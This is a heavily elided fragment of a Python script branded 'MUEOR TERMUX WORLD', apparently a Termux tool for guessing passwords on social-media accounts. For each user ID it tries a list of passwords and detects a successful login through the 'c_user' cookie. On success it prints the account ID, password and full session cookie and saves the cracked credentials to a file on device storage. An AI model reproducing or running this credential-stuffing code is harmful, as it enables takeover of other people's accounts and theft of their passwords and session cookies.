...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mMUEOR TERMUX WORLD\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
     ...
     'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [MUEOR TERMUX WORLD-❤️‍🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[❤️‍🔥]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/MUEOR TERMUX WORLDok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
